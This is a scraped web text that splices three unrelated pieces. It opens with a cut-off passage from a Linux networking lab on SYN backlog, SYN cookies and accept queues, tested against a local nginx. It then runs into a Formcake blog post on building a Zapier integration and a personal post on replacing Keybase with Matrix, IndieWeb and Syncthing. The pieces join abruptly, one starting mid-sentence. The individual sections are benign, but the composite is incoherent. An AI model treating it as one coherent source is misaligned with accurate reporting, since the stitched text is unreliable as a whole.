<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo sysctl net.core.somaxconn
net.core.somaxconn = 128
vagrant@blog-lab-scaling-accept:~$ sudo sysctl -w net.core.somaxconn=10
net.core.somaxconn = 10
vagrant@blog-lab-scaling-accept:~$ sudo systemctl restart nginx
vagrant@blog-lab-scaling-accept:~$ 
</code></pre></div></div>

<p>At this point, if more than 10 connections arrive within 400ms (before the SYN-ACK and ACK handshake complete), then 10 connections will be in the SYN backlog, which is the maximum configured. This will trigger SYN cookies to be sent, triggering the message and counters above. Let’s test out if this works, run a simulation that opens N concurrent connections:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ python /vagrant/test_send_concurrent_connections.py 127.0.0.1:80 20
Waiting, Ctrl+C to exit.
</code></pre></div></div>

<p>And verify that SYN cookies were sent as expected:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo dmesg -c
[ 2571.784749] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
vagrant@blog-lab-scaling-accept:~$ sudo nstat | grep ReqQ
TcpExtTCPReqQFullDoCookies      10                 0.0
vagrant@blog-lab-scaling-accept:~$
</code></pre></div></div>

<p>Try disabling the simulated latency with <code>sudo tc qdisc del dev lo root</code> and re-run the same test, now connections move through fast enough that SYN cookies are not sent.</p>

<p>This also demonstrates the way the Round Trip Time effects the amount of connections that can burst into a LISTEN socket - <code>test_send_concurrent_connections.py</code> does actually attempt to initiate complete connections and <code>nginx</code> on the other end is readily calling <code>accept()</code> as fast as it can, but because 20 connections are initiated at once, 20 SYN packets arrive before any handshake can continue, and the SYN backlog overflows. You can imagine that in the real world, with some of these values often defaulting to <code>128</code>, and users often being far away from servers (on the other side of the world), it’s pretty easy to accidentally trigger this scenario without a true SYN flood.</p>

<h2 id="accept-queue">Accept queue</h2>

<p>Once an ACK packet is received and validated, a new client connection is ready for the application to process. This connection is moved into the accept queue, waiting for the application to call <code>accept()</code> and receive it.</p>

<p>Unlike the SYN backlog, the accept queue has no backup plan for when it overflows. Back in the original call to <code>listen()</code>, a <code>backlog</code> argument was provided, which indicates how many connections can have completed the 3-way handshake and be waiting in the kernel for the application to accept.</p>

<p>This is the first common issue: If the <code>backlog</code> number provided to <code>listen()</code> is not large enough to contain any number of connections that could reasonably complete their handshake between 2 calls to <code>accept()</code>, then a connection will be dropped on the floor, and the application generally won’t even notice - the next call to …</p></article></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We <em>just</em> launched our integration with Zapier and have some thoughts to share on the process.</p>
<p>If you haven't heard of Zapier then you've probably never been asked to integrate your company’s API to a 3rd party product “as quickly as possible.” Zapier has become the API platform for the web and - as a company who takes in data and sheperds it through to other workflows - it was a no brainer to integrate Formcake with Zapier. Integration was straightforward enough, but still a bit of a journey, so hopefully these details that may interest those looking to do the same and shorten their learning curve a bit.</p>
<p>So what does Zapier ask from its integration partners? And what decisions did we have to make accommodate those requirements? Here is our list of top concerns.</p>
<h2 id="1-authenticating-with-zapier">1) Authenticating with Zapier</h2>
<p>Zapier obviously needs a way to communicate with your app. The two options that we considered were OAuth2 and JTW tokens. We love OAuth2 with all of its control and flexibility. Honestly it would have been a great choice for Zapier. We however ended up choosing JWT instead. With OAuth2's power comes complexity and as a small SaaS app we wanted to keep things simple. Yes, having the user connect Zapier to Formcake would have been a little more straightforward, but we also knew that we did not want to use OAuth2 for our forthcoming user API. This API will allow users to access their data simply and securely and if you have ever had to use OAuth2 for an API where you just want to make a GET request, you many identify with our thinking. In our case, we adopted a new, Zapier-specific JWT strategy that lives alongside our existing JWT auth system.</p>
<p>With our new JWT auth token system, Formcake users can navigate to API Keys, create a Zapier API Key, and plug it into Zapier. They can also see the last time a key was used and can revoke those keys that are no longer needed or have become compromised. This worked particularly well for us because it dovetails nicely into the necessary infrastructure for our user API and we think our users will appreciate the simple process of passing a JTW token with API requests. It will also be extensible should we want to integrate more tightly with any other systems in the future.</p>

<h3 id="logging-into-formcake">Logging Into Formcake:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-key-login.png" alt="Logging into formcake"></p>
<h2 id="2-polling-vs-webhook-trigger">2) Polling vs Webhook Trigger</h2>
<p>When you are setting up your Zapier integration, you have the option to create one of two types of "Triggers". You can either have Zapier regularly poll an endpoint in your API and then propagate any new changes it finds, or you can communicate with Zapier via webhooks, pushing out anything new on your end and triggering an immediate response.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-trigger-types.png" alt="Zapier polling vs webhook trigger options"></p>
<p>Of course for something like a form, the webhook method is critical, since when your form receives a submission you want it to, you know, <em>do</em> something, instead of quietly waiting for Zapier to get in touch. For those considering these options, know that creating a webhook system is not always the right choice. Creating a Polling Trigger is far more simple than creating a Webook Trigger. For data that does not change very often or has a limited set of data, polling can get your integration off the ground much faster and may be you all that you ever need. For Formcake's purposes, we knew that users would want to see something happen in Zapier immediately, especially when first creating and debugging their integration. A form could also have thousands of submissions, making polling simply not an option since Zapier would have to poll all submissions each time, creating a slower and slower process as our users get more and more value out of their forms.</p>
<h2 id="3-enable--disable">3) Enable / Disable</h2>
<p>Note that even with the webhook system in place, where we send data to Zapier instead of Zapier hitting our API, we still need to provide Zapier a way to authenticate with our app beyond simply logging the user in. This is because Zapier requires something else - a way to enable and disable webooks within our app. Zapier asks that you provide <code>/subscribe</code> and <code>/unsubscribe</code> endpoints that will turn your webhooks on and off. The <code>/subscribe</code> endpoint is meant to activate your webhook and also provide a webhook url to send your data to Zapier. This webhook url corresponds to a Zap in Zapier. The <code>/unsubscribe</code> endpoint simply turns off your webhook.</p>
<p>Within Formcake, these endpoints toggle an action's <code>active</code> property and also store the Zapier webhook url. On our own end, we use the <code>active</code> property in our own app frontend so that users can see on both platforms whether a Zap has been successfully connected. Zapier requires unsubscribing so that your app does not send data to Zapier after a Zap has been paused or deleted. Can you imagine the amount of unuseful API requests Zapier would recieve if they did not reserve the right to turn off your app's webhooks?</p>

<h2 id="4-preform-list-trigger">4) "Preform List" Trigger</h2>
<p>After giving Zapier a way to enable or disable your webhooks, your app also needs to provide a way to pull an example of whatever data your app will send to Zapier. This is accomplished in Zapier by using a Polling Trigger, but one that is not visible to the public and is only meant for other Zapier Triggers to use in order to get a list of information. In Zapier this is called a "Preform List" endpoint and is entirely optional. We would advise those making an integration use this option since it makes your Zapier integration far more useful. For Formcake, this endpoint returns a form's last 5 submissions.</p>

<h2 id="5-marketing-your-integration-beta-to-searchable">5) Marketing Your Integration (Beta to Searchable)</h2>
<p>After you are satisfied with your Zapier integration, you then need to develop a launch strategy in order to get your integration approved. Anyone is allowed to create a private integration but in order to have your integration publicly searchable on Zapier you have to satisfy a couple of requirements. Some of these are practical like providing a support contact so that Zapier can pass along support requests, but the real hurtle is getting 50 users to start using the integration. Zapier gives you access to a link that allows you to invite users to your integration. With this link users can beta test your Zap and you can tweak it to your users needs before submitting it to Zapier.</p>

<h2 id="next-steps">Next Steps</h2>
<p>Formcake's Zapier integration is currently in beta so go ahead and <a href="https://formcake.com/documentation/actions#zapier-action">try it out</a>! Formcake's free plan nicely syncs up with Zapier's where each allow you 100 free submissions per month.

There have been a few different alternatives proposed: this is <del>the best</del> mine.</p> <h2 id="-what-is-keybase">## What is Keybase?</h2> <p>Before we talk about replacing <a href="https://keybase.io/" rel="noopener noreferrer" target="_blank">Keybase</a>, we should have a good idea of what Keybase actually is. It's main features are as follows (ordered as on the website):</p> <ul> <li>E2EE chats and messaging (people and teams).</li> <li>Cryptographic identity verification from around the net.</li> <li><a href="https://book.keybase.io/docs/files" rel="noopener noreferrer" target="_blank">KBFS</a> (Public signed file hosting, private E2EE file storage w/ sharing, <a href="https://book.keybase.io/docs/files#keybase-pub" rel="noopener noreferrer" target="_blank">Static site hosting??</a>)</li> <li>Git repositories? Crypto? <a href="https://saltpack.org/" rel="noopener noreferrer" target="_blank">An alternative to PGP?</a></li> </ul> <h2 id="-previous-attempts-to-replace-keybase">## Previous Attempts to Replace Keybase</h2> <p>I'm not the first person to try this, obviously. Some brave folks have tried to build Keybase alternatives, such as <a href="https://keys.pub/" rel="noopener noreferrer" target="_blank">keys.pub</a> and the brand-new <a href="https://keyoxide.org/" rel="noopener noreferrer" target="_blank">Keyoxide</a>. I've tried both, but found that though they both are good in their own right, they are not the solutions that I am looking for.</p> <h2 id="-ok-time-for-the-steps">## OK Time for the Steps</h2> <h3 id="-step-1-chatmessaging">### Step #1: Chat/Messaging</h3> <p>There are a few great pre-existing options for encrypted messaging: <a href="https://signal.org/" rel="noopener noreferrer" target="_blank">Signal</a>, <a href="https://beta.protonmail.com/" rel="noopener noreferrer" target="_blank">ProtonMail</a> if you want to go full email, <a href="https://telegram.org/" rel="noopener noreferrer" target="_blank">Telegram</a>, and <a href="https://www.whatsapp.com/" rel="noopener noreferrer" target="_blank">WhatsApp</a>. However, they all have their problems (though I use the first two on a daily basis). Signal requires a phone number, and is more of an iMessage/text replacement than a Slack-style chat app. Protonmail is literally not chat – it's email. Telegram is <a href="https://news.ycombinator.com/item?id=6936539" rel="noopener noreferrer" target="_blank">not</a> <a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=http://habrahabr.ru/post/206900/" rel="noopener noreferrer" target="_blank">secure</a>. If you use WhatsApp for security you might be crazy –&nbsp;I only use it because it's <em>the way</em> to communicate with people in the Middle East and Africa.</p> <p>Instead, I would recommend you use <a href="https://matrix.org/" rel="noopener noreferrer" target="_blank"><strong>Matrix</strong></a>. Matrix is an "open network for secure, decentralized communication," and it's the perfect replacement for Keybase's chat <del>and I would argue most other chat apps too</del>. It utilizes E2E encrypted messaging, and can be self-hosted as well <del>or if you're cheap like me just get your friend to host</del>.</p> <p>In addition to a Matrix server, you also need a client. For this, I recommend <a href="https://about.riot.im/" rel="noopener noreferrer" target="_blank"><strong>Riot</strong></a>. Riot is a beautiful Matrix client with a bunch of awesome features, including Slack-like integrations, and apps for pretty much every major platform (Linux, MacOS, Windows, iOS, Android, and a web client). <del>Plus it looks a lot like Discord.</del></p> <h3 id="-step-2-identity-verification">### Step #2: Identity verification</h3> <p>Replacing Keybase's <a href="https://web.archive.org/web/20140322062148/https://keybase.io/" rel="noopener noreferrer" target="_blank">original function</a> is probably the most difficult part of this tutorial: cryptographically verified identity proofs is a great and innovative idea. I would swap this out with an <a href="https://indieweb.org/" rel="noopener noreferrer" target="_blank"><strong>IndieWeb</strong></a> profile –&nbsp;one <a href="http://microformats.org/wiki/h-card" rel="noopener noreferrer" target="_blank">part</a> of the larger <a href="http://microformats.org/" rel="noopener noreferrer" target="_blank">microformats</a> HTML structure. There are some pretty great tutorials out there (I would recommend <a href="https://kevq.uk/how-to-create-an-indieweb-profile/" rel="noopener noreferrer" target="_blank">this one</a> by the fantastic <a href="https://kevq.uk/" rel="noopener noreferrer" target="_blank">Kev Quirk</a> and <a href="https://randomgeekery.org/post/2020/04/indieweb-h-cards/" rel="noopener noreferrer" target="_blank">this one</a> by <a href="https://randomgeekery.org/" rel="noopener noreferrer" target="_blank">Brian Wisti</a>), so I won't go into too much detail about exactly how to do that. However, it's important to note that though Kev recommends hiding your h-card with the <code>display: none;</code> property: <a href="https://indieweb.org/antipatterns#invisible_metadata" rel="noopener noreferrer" target="_blank">don't do that</a>. I just merged my about and contact pages onto my homepage, and added the microformats classes to my existing markup.</p> <p><img alt="My IndieWeb h-card" src="https://figbert.com/content/posts/how-to-replace-keybase-in-three-easy-steps/h-card.png"></p> <h3 id="-step-3-file-storage">### Step #3: File Storage</h3> <p>Replacing KBFS is easy to do, but hard to get right. Swapping to <a href="https://www.google.com/drive/" rel="noopener noreferrer" target="_blank">Google Drive</a> is probably the move that most people would make, but that abandons the entire security/encryption aspect of Keybase. There's also <a href="https://www.dropbox.com/" rel="noopener noreferrer" target="_blank">Dropbox</a>, but that has the same problems as above. <a href="https://twitter.com/ProtonMail/status/1278389663078768641" rel="noopener noreferrer" target="_blank">ProtonDrive</a> has potential, but it's not out yet. Enter <a href="https://syncthing.net/" rel="noopener noreferrer" target="_blank"><strong>Syncthing</strong></a>. <a href="https://tonsky.me/blog/syncthing/" rel="noopener noreferrer" target="_blank">Nikita Tonsky</a> wrote one of my favorite posts of all time about Syncthing – go read it. One reason Syncthing is so great is that it's not the same thing as KBFS or any of the other "Drive" solutions. Instead of being a file hosting system, it's a "continuous file synchronization program." You have no data limits other than your storage and no third-party to worry about. Plus, sharing folders is also incredibly easy. Just read the article.</p> <h3 id="-bonus-step-4-video-calling">### Bonus Step #4: Video Calling</h3> <p>It would be a shame to talk about text chat, or really any form of communication, in this new pandemic age without talking about video chat. After all, the whole reason I'm writing this article is because the new videocalling giant <a href="https://zoom.us/" rel="noopener noreferrer" target="_blank">Zoom</a>. So, how have I replaced Zoom and how does that relate to replacing Keybase? Well, Matrix happens to have a fantastic <a href="https://jitsi.org/" rel="noopener noreferrer" target="_blank">Jitsi Meet</a> <a href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi" rel="noopener noreferrer" target="_blank">integration</a>. Plus, the folks over at Jitsi are <a href="https://jitsi.org/blog/e2ee/" rel="noopener noreferrer" target="_blank">working on E2E encryption for their calls</a>. I've integrated Jitsi Meet into my self-hosted instance of Matrix, and now all my videocalls are just that – mine!</p> <h2 id="-summary">## Summary</h2> <ul> <li>Swapped chat to Matrix and Riot.</li> <li>Swapped identity verification to Indieweb.</li> <li>Swapped file storage/sync to Syncthing.</li> <li>Added videocalling to chat program via Jitsi.</li> </ul> <h2 id="-conclusion">## Conclusion</h2> <p>Keybase is a great service, and the people who work there should be really proud of what they've built. However, given Zoom's aquisition of the company, the stability and security of the product have been called into question. So, ever one to hop on a hype train, I jumped ship. I'm really happy with my solution, and I'd love to hear your thoughts as well <del>as soon as I set up webcomments</del>.</p> </section></article></div>]]>
